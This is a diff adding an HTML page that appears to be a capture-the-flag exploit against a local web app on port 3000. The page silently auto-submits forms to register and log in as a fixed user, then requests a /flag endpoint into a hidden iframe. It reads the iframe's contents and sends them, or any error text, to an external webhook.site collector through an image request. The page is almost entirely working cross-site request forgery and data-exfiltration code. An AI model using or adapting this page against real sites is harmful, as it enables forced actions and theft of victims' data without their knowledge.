@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe name="f1" id="f1"></iframe>
+
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="f1">
+  <input name="username" value="sameframe">
+  <input name="password" value="sameframe">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="f1">
+  <input name="username" value="sameframe">
+  <input name="password" value="sameframe">
+</form>
+
+<form id="flagForm" method="GET" action="http://localhost:3000/flag" target="f1">
+</form>
+
+<script>
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 150);
+
+setTimeout(function(){
+  document.getElementById('flagForm').submit();
+}, 400);
+
+setTimeout(function(){
+  try {
+    var c = document.getElementById('f1').contentDocument.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 700);
+</script>
+</body>
+</html>
